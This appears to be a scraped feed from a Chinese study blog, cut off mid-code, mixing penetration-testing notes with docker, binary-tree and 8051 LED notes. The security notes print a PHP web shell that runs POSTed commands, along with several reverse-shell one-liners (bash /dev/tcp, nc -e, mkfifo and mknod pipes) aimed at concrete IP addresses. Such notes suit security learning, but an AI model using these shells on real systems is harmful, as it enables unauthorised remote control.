<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">exec</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$command</span> [, <span class="hljs-keyword">array</span> &amp;<span class="hljs-variable">$output</span> [, <span class="hljs-keyword">int</span> &amp;<span class="hljs-variable">$return_var</span> ]] )<br></code></pre></td></tr></table></figure><pre><code class="hljs"> 执行一个外部程序，exec() 执行 command 参数所指定的命令。   exec执行系统外部命令时**不会输出结果**，而是返回结果的最后一行。如果想得到结果，可以使用第二  个参数，让其输出到指定的数组。此数组一个记录代表输出的一行。即如果输出结果有20行，则这个  数组就有20条记录，所以如果需要反复输出调用不同系统外部命令的结果，最好在输出每一条系统外  部命令结果时清空这个数组unset($output)，以防混乱。第三个参数用来取得命令执行的状态码，  通常执行成功都是返回0。  </code></pre>   <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 输出运行中的 php/httpd 进程的创建者用户名</span><br><span class="hljs-comment">// （在可以执行 &quot;whoami&quot; 命令的系统上）</span><br><span class="hljs-comment">// echo exec(&#x27;whoami&#x27;);</span><br><span class="hljs-comment">// exec(&#x27;ls -la&#x27;, $return);</span><br><span class="hljs-comment">// var_dump($return);</span><br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];  <span class="hljs-comment"># 获取参数给cmd</span><br>@<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$return</span>);  <span class="hljs-comment">#调用函数</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$return</span>) <span class="hljs-comment"># 输出数组</span><br><span class="hljs-meta">?&gt;</span><br>   <br></code></pre></td></tr></table></figure><ol start="2"><li><p>system()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">system</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$command</span> [, <span class="hljs-keyword">int</span> &amp;<span class="hljs-variable">$return_var</span> ] )<br></code></pre></td></tr></table></figure><p>  函数执行 command 参数所指定的命令， 并且输出执行结果。  </p><p>  system和exec的区别在于，system在执行系统外部命令时，直接将结果输出到浏览器，如果执行命令  </p><p>成功则返回true，否则返回false。第二个参数与exec第三个参数含义一样。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span>;<br><span class="hljs-comment">// 输出 shell 命令 &quot;ls&quot; 的返回结果</span><br><span class="hljs-comment">// 并且将输出的最后一样内容返回到 $last_line。</span><br><span class="hljs-comment">// 将命令的返回值保存到 $retval。</span><br><span class="hljs-variable">$last_line</span> = <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>, <span class="hljs-variable">$retval</span>);<br><span class="hljs-comment">// 打印更多信息</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;/pre&gt;</span><br><span class="hljs-string">&lt;hr /&gt;Last line of the output: &#x27;</span> . <span class="hljs-variable">$last_line</span> . <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;hr /&gt;Return value: &#x27;</span> . <span class="hljs-variable">$retval</span>;<br><span class="hljs-meta">?&gt;</span><br>   <br></code></pre></td></tr></table></figure></li></ol><h3 id="命令常用的特殊字符"><a href="#命令常用的特殊字符" class="headerlink" title="命令常用的特殊字符"></a>命令常用的特殊字符</h3><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230825002853984.png" alt="image-20230825002853984"></p><h2 id="web安全-漏洞扫描器"><a href="#web安全-漏洞扫描器" class="headerlink" title="web安全-漏洞扫描器"></a>web安全-漏洞扫描器</h2><h3 id="XRAY"><a href="#XRAY" class="headerlink" title="XRAY"></a>XRAY</h3><p>  xray 是一款功能强大的安全评估工具，由多名经验丰富的一线安全从业者呕心打造而成，主要特性有:  </p><blockquote><p>检测速度快：发包速度快; 漏洞检测算法高效。  </p><p>支持范围广：大至 OWASP Top 10 通用漏洞检测，小至各种 CMS 框架 POC，均可以支持。  </p><p>代码质量高：编写代码的人员素质高, 通过 Code Review、单元测试、集成测试等多层验证来提高代  码可靠性。  </p><p>高级可定制：通过配置文件暴露了引擎的各种参数，通过修改配置文件可以极大的客制化功能。  </p><p>安全无威胁：xray 定位为一款安全辅助评估工具，而不是攻击工具，内置的所有 payload 和  poc 均为无害化检查。</p></blockquote><ol><li><p>爬虫模式</p><blockquote><p>  <em>#</em> 完整  </p><p>  xray.exe webscan –basic-crawler  <a href="http://testphp.vulnweb.com/">http://testphp.vulnweb.com/</a> –html-outputvulnweb.com-1.html</p><p>  <em>#</em> 简化  </p><p>xray.exe ws –basic <a href="http://testphp.vulnweb.com/">http://testphp.vulnweb.com/</a> –ho vulnweb.com-2.html</p></blockquote></li><li><p>被动扫描</p><ul><li><p>生成CA证书</p><blockquote><p>xray.exe genca</p></blockquote></li><li><p>浏览器代理</p></li><li></li></ul></li></ol><h2 id="web安全-linux反弹shell"><a href="#web安全-linux反弹shell" class="headerlink" title="web安全-linux反弹shell"></a>web安全-linux反弹shell</h2><h3 id="linux文件描述符"><a href="#linux文件描述符" class="headerlink" title="linux文件描述符"></a>linux文件描述符</h3><p>  文件描述符是一个非负整数，内核需要通过这个文件描述符才可以访问文件  文件描述符好比一本书的目录（索引），通过这个索引可以找到需要的内容  在Linux系统中内核默认为每个进程创建三个标准的文件描述符：0（标准输入）、1（标准输出）、2（标准错误）</p><p>  通过查看 <code>/proc/PID/fd </code>目录下的文件，就可以查看每个进程拥有的所有文件描述符  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826090524816.png" alt="image-20230826090524816"></p><p>255是一个小技巧，bash用于在重定向时保留这些副本</p><p>当打开文件时，系统内核会为特定的进程自动创建对应的文件描述符，也就是说每一个进程的输入输出error不一样，不同的进程打开同一个文件时，它们的文件描述符可能不同，但同一个进程打开同一个文件时，它们的文件描述符是相同的。</p><h3 id="linux文件描述符操作"><a href="#linux文件描述符操作" class="headerlink" title="linux文件描述符操作"></a>linux文件描述符操作</h3><p>以下操作只针对某一个进程</p><ol><li><p>更改标准输出位置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">exec 1&gt; test<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826091742826.png" alt="image-20230826091742826"></p></li><li><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826091803283.png" alt="image-20230826091803283"></p></li><li><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826091837807.png" alt="image-20230826091837807"></p></li><li><p>&#x2F;dev&#x2F;null</p><p>特殊文件，写入的任何东西都会被清空</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826091936362.png" alt="image-20230826091936362"></p></li></ol><h3 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a>bash反弹shell</h3><p>bash反弹shell，只针对bash</p><p>由于外网机无法访问到内网机，但是内网机能ping外网机，于是使用反弹shell的方式，帮助外网机获得内网机的shell得到</p><p>反弹shell，就是可以理解为，外网可以执行内网机的shell，这里是bash</p><p>第一步首先让控制端监听端口</p><blockquote><p>nc -lvvp 6666（端口）</p></blockquote><p>第二步</p><blockquote><p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;被控端ip&#x2F;与控制端相同的端口 0&gt;&amp;1</p></blockquote><p>0&gt;&amp;1的意思是，本地的输出也输出给控制端，有点像发送信息</p><p>参数讲解</p><blockquote><p>  bash -i  打开一个交互式的bash shell。  </p><p>  &#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;PORT  </p><p>  &#x2F;dev&#x2F;tcp&#x2F;是Linux中的一个特殊设备文件（Linux一切皆文件），实际这个文件是不存在的，它只是 bash  实现的用来实现网络请求的一个接口。  打开这个文件就相当于发起了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket  连接中传输数据。  </p><p>  &#x2F;dev&#x2F;tcp&#x2F;192.168.81.154&#x2F;6666  </p><p>和192.168.81.154的6666端口建立TCP连接</p></blockquote><h3 id="Linux反弹shell的方法"><a href="#Linux反弹shell的方法" class="headerlink" title="Linux反弹shell的方法"></a>Linux反弹shell的方法</h3><h4 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h4><ol><li><p>NC正向反弹</p><p>正向的意思，由控制端主动发出请求，用于控制端能连接上被控端就行</p><p>但是注意有可能nc不支持-e参数</p><blockquote><p>  被控端：  </p><p>  nc -lvvp 6666 -e &#x2F;bin&#x2F;sh  </p><p>  控制端：  </p><p>  nc 10.10.1.7 6666  </p><p>  原  </p><p>  理：  </p><p>  被控端使用nc将&#x2F;bin&#x2F;sh绑定到本地的6666端口，控制端主动连接被控端的6666端口，即可获得shell  </p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826111509035.png" alt="image-20230826111509035"></p></li><li><p>NC反向shell</p><p>当被控端能够访问控制端的时候使用</p><blockquote><p>  控制端：  </p><p>  nc -lvvp 6666  </p><p>  被控端：  </p><p>  nc -e &#x2F;bin&#x2F;sh 10.10.1.11 6666  </p><p>  原理：  </p><p>被控端使用nc将&#x2F;bin&#x2F;sh发送到控制端的6666端口，控制端只需要监听本地的6666端口，即可获得shell。</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826111624663.png" alt="image-20230826111624663"></p><p>无e参数，反弹shell,有些情况下nc 指令没有-e的参数，就是用下面的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 139.155.49.43 6666 &gt;/tmp/f<br></code></pre></td></tr></table></figure><blockquote><p>  mkﬁfo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给&#x2F;bin&#x2F;sh，sh会执行管道里的  命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路。  </p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mknod backpipe p; nc 47.101.214.85 6666 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker的使用</title>
    <link href="/2023/08/19/others/docker%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2023/08/19/others/docker%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="docker的使用"><a href="#docker的使用" class="headerlink" title="docker的使用"></a>docker的使用</h1><h2 id="Docker镜像操作"><a href="#Docker镜像操作" class="headerlink" title="Docker镜像操作"></a>Docker镜像操作</h2><ol><li><p>列出镜像</p><blockquote><p>docker image ls -a</p></blockquote></li><li><p>拉取镜像</p><blockquote><p>docker image pull  镜像名称&#x2F;仓库的位置</p></blockquote><p>docker官方提供的image文件存在Library组里面，所以拉取u这个仓库的镜像的时候可以不用管仓库名称</p></li><li><p>删除镜像</p><blockquote><p>docker image rm 镜像名称或者镜像的id</p><p>docker rmi 镜像的名称或者id</p></blockquote><p>注意当有容器在使用镜像的时候应该先删除容器，使用包括，正在运行的容器或者stop的容器</p></li></ol><h2 id="容器操作"><a href="#容器操作" class="headerlink" title="容器操作"></a>容器操作</h2><ol><li><p>创建容器</p><blockquote><p>docker run [option]  镜像名   向容器传入的命令（一般出入&#x2F;bin&#x2F;bash）</p></blockquote><blockquote><p>-i 表示以“交互模式”运行容器<br>-t 表示容器启动后会进入其命令行。加入这两个参数后，容器创建就能登录进去。即 分配一个伪终端。<br>–name 为创建的容器命名<br>-v 表示目录映射关系(前者是宿主机目录，后者是映射到宿主机上的目录，即 宿主机目录:容器中目录)，可<br>以使 用多个-v 做多个目录或文件映射。注意:最好做目录映射，在宿主机上做修改，然后 共享到容器上。<br>-d 在run后面加上-d参数,则会创建一个守护式容器在后台运行(这样创建容器后不 会自动登录容器，如果只加-i -t 两个参数，创建后就会自动进去容器)。<br>-p 表示端口映射，前者是宿主机端口，后者是容器内的映射端口。可以使用多个-p 做多个端口映射<br>-e 为容器设置环境变量<br>–network&#x3D;host 表示将主机的网络环境映射到容器中，容器的网络与主机相同</p></blockquote><ul><li><p>创建一个交互式的容器</p><p>我们需要在创建的时候附加上it</p></li><li><p>创建一个守护式容器</p><p>守护式的容器，在容器内部exit但是容器不会stop，如果需要一个长时间运行的容器可以使用这个</p><blockquote><p>docker run -dit –name&#x3D;test centos</p></blockquote><p>创建一个名为test 的容器，使用的镜像是centos，这样运行可以帮助pull镜像，但是还是手动pull好一点</p></li></ul></li><li><p>进入运行的容器</p></li></ol><blockquote><p>docker exet -it 容器的名称 传入的命令</p></blockquote><ol start="3"><li><p>查看容器</p><blockquote><p>docker ps (-a)</p></blockquote></li><li><p>停止与启动容器</p><ul><li><p>停止</p><blockquote><p>docker stop 容器名称或者id</p></blockquote></li><li><p>关闭</p><blockquote><p>docker  kill 容器名称或者id</p></blockquote></li><li><p>启动</p><blockquote><p>docker start 容器名称或者id</p></blockquote></li></ul></li><li><p>删除容器</p><blockquote><p>docker rm 容器的名称和id</p></blockquote></li></ol><h2 id="制作镜像"><a href="#制作镜像" class="headerlink" title="制作镜像"></a>制作镜像</h2><ol><li><p>保存容器为镜像</p><blockquote><p>docker commit mycentos3 mycentos3</p></blockquote></li></ol><h2 id="容器备份和迁移"><a href="#容器备份和迁移" class="headerlink" title="容器备份和迁移"></a>容器备份和迁移</h2><blockquote><p> # docker save -o 保存的文件名 镜像名</p><p>docker save -o .&#x2F;mycentos3.tar mycentos3</p></blockquote><ul><li><p>将镜像文件加载到本地</p><blockquote><p>docker load -i .&#x2F;centos.tar</p></blockquote></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二叉树与并查集</title>
    <link href="/2023/08/19/%E7%AE%97%E6%B3%95/learn/%E4%BA%8C%E5%8F%89%E6%A0%91%E4%B8%8E%E5%B9%B6%E6%9F%A5%E9%9B%86/"/>
    <url>/2023/08/19/%E7%AE%97%E6%B3%95/learn/%E4%BA%8C%E5%8F%89%E6%A0%91%E4%B8%8E%E5%B9%B6%E6%9F%A5%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="二叉树与并查集"><a href="#二叉树与并查集" class="headerlink" title="二叉树与并查集"></a>二叉树与并查集</h1><h2 id="树的基本概念"><a href="#树的基本概念" class="headerlink" title="树的基本概念"></a>树的基本概念</h2><p>可见于数据结构和算法的笔记，更加详细</p><ol><li>空树</li><li>树的特性<ul><li>任意一个树的两个节点，有且只有一条边</li><li>一个节点数为n的树，边的数量是n-1</li><li>任意一个数加一条边就会变成图，也就是有回路</li></ul></li></ol><h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><ol><li><p>二叉树是有序树</p></li><li><p>斜树</p><p>全是右子树或者左子树</p></li><li><p>满二叉树</p><p>叶子全部出现最底层</p></li><li><p>完成二叉树</p><p>底层可以不完全存在，但是需要优先左子树</p></li><li><p>第i 层具有2^1-1^个节点</p></li><li><p>深度为k的树，最多有2^k^-1个节点，</p></li><li><p>度为2的节点数为n，那么叶子节点而数量是2*n</p></li><li><p>在完全二叉树中，如果一共有n个节点，那么右[log2 n]+1的层，[log2 n]是向下取整</p></li><li><p>遍历</p><ul><li>前序：根，左，右</li><li>中序：左，根，右</li><li>后序：左，右，根</li></ul></li></ol><h2 id="并查集"><a href="#并查集" class="headerlink" title="并查集"></a>并查集</h2><p>1. </p>]]></content>
    
    
    
    <tags>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>51MCN</title>
    <link href="/2023/08/10/%E5%B5%8C%E5%85%A5%E5%BC%8F/51MCN/"/>
    <url>/2023/08/10/%E5%B5%8C%E5%85%A5%E5%BC%8F/51MCN/</url>
    
    <content type="html"><![CDATA[<h1 id="51单片机"><a href="#51单片机" class="headerlink" title="51单片机"></a>51单片机</h1><h2 id="51里的最小的系统"><a href="#51里的最小的系统" class="headerlink" title="51里的最小的系统"></a>51里的最小的系统</h2><h3 id="晶振电路"><a href="#晶振电路" class="headerlink" title="晶振电路"></a>晶振电路</h3><h2 id="点亮LED灯"><a href="#点亮LED灯" class="headerlink" title="点亮LED灯"></a>点亮LED灯</h2><p>p2默认全是高电频</p><h3 id="GPIO"><a href="#GPIO" class="headerlink" title="GPIO"></a>GPIO</h3><p>是通用的输入，输出设备</p><h3 id="点亮第一个灯的程序"><a href="#点亮第一个灯的程序" class="headerlink" title="点亮第一个灯的程序"></a>点亮第一个灯的程序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;reg52.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> u8;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> u16;<br><br>sbit LED1 = P2;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delay_10us</span><span class="hljs-params">(u16 ten_us)</span><br>&#123; <span class="hljs-comment">//当传入1 的时候，大约延迟10us</span><br>    <span class="hljs-comment">//不精确的延时</span><br>    <span class="hljs-keyword">while</span> (ten_us--) &#123;&#125;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        LED1 = <span class="hljs-number">0</span>; <span class="hljs-comment">//点亮</span><br>        delay_10us(<span class="hljs-number">50000</span>);<br>        LED1 = <span class="hljs-number">1</span>;<span class="hljs-comment">//熄灭</span><br>        delay_10us(<span class="hljs-number">50000</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="流水灯"><a href="#流水灯" class="headerlink" title="流水灯"></a>流水灯</h3><ol><li><p>基于位运算实现流水灯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;reg52.h&gt;</span></span><br>   <br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> u8;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> u16;<br>   <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LED_PORT P2  </span><br>   <br><span class="hljs-type">void</span> <span class="hljs-title function_">delay_10us</span><span class="hljs-params">(u16 ten_us)</span><br>&#123; <span class="hljs-comment">//当传入1 的时候，大约延迟10us</span><br>    <span class="hljs-comment">//不精确的延时</span><br>    <span class="hljs-keyword">while</span> (ten_us--) &#123;&#125;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    u8 i=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) <br>    &#123;<br>   <br>   <br>        LED_PORT= <span class="hljs-number">0x00</span>;<br>        delay_10us(<span class="hljs-number">100000</span>);<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++)<br>        &#123;<br>            LED_PORT=~(<span class="hljs-number">0x01</span>&lt;&lt;i);    <br>            delay_10us(<span class="hljs-number">50000</span>);<br>        &#125;<br>   <br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>使用库函数进行左右移动</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;reg52.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;intrins.h&gt;</span>  <span class="hljs-comment">//左移右移的头文件</span></span><br>   <br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> u8;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> u16;<br>   <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LED_PORT P2</span><br>   <br><span class="hljs-type">void</span> <span class="hljs-title function_">delay_10us</span><span class="hljs-params">(u16 ten_us)</span><br>&#123; <span class="hljs-comment">//当传入1 的时候，大约延迟10us</span><br>    <span class="hljs-comment">//不精确的延时</span><br>    <span class="hljs-keyword">while</span> (ten_us--) &#123;&#125;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    u8 i     = <span class="hljs-number">0</span>;<br>    LED_PORT = <span class="hljs-number">0x00</span>;<br>    delay_10us(<span class="hljs-number">100000</span>);<br>    LED_PORT = <span class="hljs-number">0x01</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">7</span>; i++) &#123;<br>            LED_PORT = _crol_(LED_PORT, <span class="hljs-number">1</span>);  <span class="hljs-comment">//往左移</span><br>            delay_10us(<span class="hljs-number">50000</span>);<br>        &#125;<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">7</span>; i++) &#123;<br>            LED_PORT = _cror_(LED_PORT, <span class="hljs-number">1</span>);  <span class="hljs-comment">//往右移</span><br>            delay_10us(<span class="hljs-number">50000</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>使用独立的按键控制灯的亮灭</p><p>我们控制专门的一盏灯，使用头文件REGX52.H控制每位寄存器的方式</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/qt/qt1/image-20230813080613733.png" alt="image-20230813080613733"></p><p>下面是代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;REGX52.H&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;intrins.h&gt;</span></span><br>   <br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> u8;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LED_PORT P2</span><br>   <br><span class="hljs-type">void</span> <span class="hljs-title function_">Delay500ms</span><span class="hljs-params">()</span> <span class="hljs-comment">//@11.0592MHz</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> data i, j, k;<br>   <br>    _nop_();<br>    _nop_();<br>    i = <span class="hljs-number">22</span>;<br>    j = <span class="hljs-number">3</span>;<br>    k = <span class="hljs-number">227</span>;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-keyword">while</span> (--k)<br>                ;<br>        &#125; <span class="hljs-keyword">while</span> (--j);<br>    &#125; <span class="hljs-keyword">while</span> (--i);<br>&#125;<br>   <br>   <br><span class="hljs-type">void</span> <span class="hljs-title function_">Delay250ms</span><span class="hljs-params">()</span><span class="hljs-comment">//@11.0592MHz</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> data i, j, k;<br>   <br>    _nop_();<br>    _nop_();<br>    i = <span class="hljs-number">11</span>;<br>    j = <span class="hljs-number">130</span>;<br>    k = <span class="hljs-number">111</span>;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>            <span class="hljs-keyword">while</span> (--k);<br>        &#125; <span class="hljs-keyword">while</span> (--j);<br>    &#125; <span class="hljs-keyword">while</span> (--i);<br>&#125;<br>   <br>   <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    u8 i = <span class="hljs-number">0</span>;<br>   <br>    P2 = <span class="hljs-number">0xFF</span>;<br>    <span class="hljs-keyword">while</span> (<span 